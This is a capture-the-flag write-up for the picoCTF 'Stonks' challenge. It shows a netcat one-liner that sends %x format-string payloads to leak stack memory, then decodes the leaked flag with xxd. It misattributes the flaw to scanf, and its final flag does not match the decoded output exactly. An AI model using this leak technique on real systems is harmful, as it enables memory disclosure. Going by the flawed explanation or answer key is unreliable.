# Stonks
Category: Binary Exploitation\
Points: 20

## Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) *nc mercury.picoctf.net 16439*

## Solution
Looking at the *vuln.c* code snippits below, there were two places where user input is accepted. The integer input is properly passed by reference, removing the possibility of specifying a memory location. The string input width is properly specified, removing the option for a buffer overflow through trivial padding.

```c
int resp = 0;
[...]
printf("Welcome back to the trading app!\n\n");
printf("What would you like to do?\n");
printf("1) Buy some stonks!\n");
printf("2) View my portfolio\n");
scanf("%d", &resp);
[...]
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
```

However, *scanf* is still vulnerable to formatting attacks. By passing *%x* as input, we can get the program to output the stack as hex data.
```
$ echo 1 `for i in {1..32}; do echo -ne %x; done` | nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
83cd390804b00080489c3f7f6dd80ffffffff183cb160f7f7b110f7f6ddc7083cc180183cd37083cd3906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff9c007df7fa8af8f7f7b440ea11670010f7e0abe9f7f7c0c0f7f6d5c0
Portfolio as of Sun Jul 18 06:28:02 UTC 2021


1 shares of A
2 shares of TNK
58 shares of KSJ
69 shares of J
126 shares of R
Goodbye!
```

Saving the hex characters to a file and running that through *xxd* showed something resembling a flag, but the endian needs to be adjusted.
```
$ echo 83cd390804b00080489c3f7f6dd80ffffffff183cb160f7f7b110f7f6ddc7083cc180183cd37083cd3906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff9c007df7fa8af8f7f7b440ea11670010f7e0abe9f7f7c0c0f7f6d5c0 > hex
$ cat hex | xxd -r -p
����H�?m�������{m�p��▒��<Ӑocip{FTC0l_I4_t5m_ll0m_y_y3nbc7ceac6��}�������@�g������������
```

*xxd* is not able to adjust endian when converting from hex. So the text is converted back to hex using the correct endian mode, and converted back to text from there. But it's still a little off...
```
$ cat hex | xxd -r -p | xxd -e | xxd -r -p
9̓��?�H��m�����{�p�m �▒�7�co��F{pi0l0CT_4I__m5tm0ll�@y_y_cbn3aec7��6cP��}�����@��g`�����������
```

The endian conversion messed up the byte order even more, so it seems the word grouping is offset. Adjusting that output the flag!
```
cat hex | xxd -r -p | xxd -e -s+2 | xxd -r -p
9�H��m?���˃�{�m▒̃p"7̓��picoCTF{2I_l05t_4ll_my_m0Bn3y_c7cb6cae}��R����@���g����b���������
```

### Flag
```
picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}
```